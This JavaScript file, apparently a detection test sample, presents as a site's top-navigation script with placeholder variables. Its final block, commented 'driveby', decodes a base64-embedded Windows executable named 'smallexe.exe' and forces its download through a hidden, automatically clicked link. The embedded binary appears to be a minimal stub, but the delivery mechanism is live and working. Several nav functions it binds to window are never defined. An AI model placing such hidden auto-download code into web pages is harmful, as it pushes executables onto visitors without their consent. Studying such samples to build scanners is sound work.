var foo = 1;
var bar = 2;

var _0xabc123 = 0x1;
var bar = 2;

let test1;
const test2 = 5;

var HOST = "https://www.example.org";
console.log("SENDING REQUEST TO HOST " + HOST);

const teleport = "123 test";


var TopNavBar = {
    defaultHeight: '88px',
    mainNavHeightPx: 56,
    secondaryNavHeightPx: 32,
    fullHeight: '100vh',
    element: document.getElementById('top-nav-bar'),
    // searchFromBox: false,
    // fullScreenNav: false,
    // fullScreenSearchResults: false,
    parentLayoutNotifier: null,
    parentRedirectNotifier: null,
    inIframe: null,
    location: null,
    env: null,
    loggedIn: null,
    configured: false,
    hasNetworkSecondaryNav: false,
    mobileNavScrollInterval: null,
    altProfileBaseUrl: 'https://www.w3profile.com',
    pathfinderApiBaseUrl: 'https://api.kai.w3sapi.com/pathfinder',
    profilePictureUrl: null,
    _debug: null
  };

TopNavBar._findInnerElements = function (parentElement, queryStr, callback) {
	var output = [];

	var hasCallback = typeof callback !== 'undefined';

	var elements = parentElement.querySelectorAll(queryStr);

	for (var index = 0; index < elements.length; index++) {
	  output.push(elements[index]);

	  if (hasCallback) {
		callback(elements[index], index);
	  }
	}

	return output;
};

window.w3_open = TopNavBar.openMenu;
window.w3_close = TopNavBar.closeMenu;
window.w3_open_nav = TopNavBar.openNavItem;
window.w3_close_nav = TopNavBar.closeNavItem;
window.w3_close_all_topnav = TopNavBar.closeAllNavItems;
window.open_search = TopNavBar.googleSearchFocusInput;
window.gSearch = TopNavBar.googleSearchInit;

// from https://github.com/katahiromz/smallexe/releases/tag/1.1
var filename = "smallexe.exe"
var filedata = "TVpgAAEAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUAAAAA4fuAFMzSFCT0JCT0JCT0JQRQAATAEBABjRM14AAAAAAAAAAOAAAwELAQkAEAAAAAAAAAAAAAAAcAEAAHABAABwAQAAAABAABAAAAAQAAAABQAAAAAAAAAFAAAAAAAAAIABAABwAQAAAAAAAAIAAIAAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC50ZXh0AAAACQAAAKABAAAQAAAAoAEAAAAAAAAAAAAAAAAAACAAAGBVi+wzwMnCEAAAAAAAAAAA"

function base64tobytes(b64data){
  var binary_values = atob(b64data);
  var binary_length = binary_values.length;
  var bytes_data = new Uint8Array(binary_length);

  for (var i=0; i < binary_length; i++){
    bytes_data[i] = binary_values.charCodeAt(i);
  }

  return bytes_data.buffer;
}

var filebytes = base64tobytes(filedata)
var blob = new Blob([filebytes], {"type":"octet/stream"});

// driveby
var anchor = document.createElement("a");
document.body.append(anchor);
anchor.style = "display:none;";
var url = window.URL.createObjectURL(blob);
anchor.href = url;
anchor.download = filename;
anchor.click();
window.URL.revokeObjectURL(url);